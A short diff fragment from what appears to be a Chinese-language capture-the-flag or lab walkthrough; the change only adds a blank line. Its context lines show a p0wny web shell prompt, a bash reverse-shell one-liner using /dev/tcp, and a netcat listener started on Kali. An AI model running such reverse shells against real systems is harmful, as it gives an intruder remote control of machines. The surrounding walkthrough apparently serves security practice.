@@ -194,6 +194,7 @@ p0wny@shell:/home/brexit#
 `/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'`
 
 在kali开启监听，链接
+
 ```
 └─$ rlwrap -cAr nc -lvnp 1234     
 listening on [any] 1234 ...
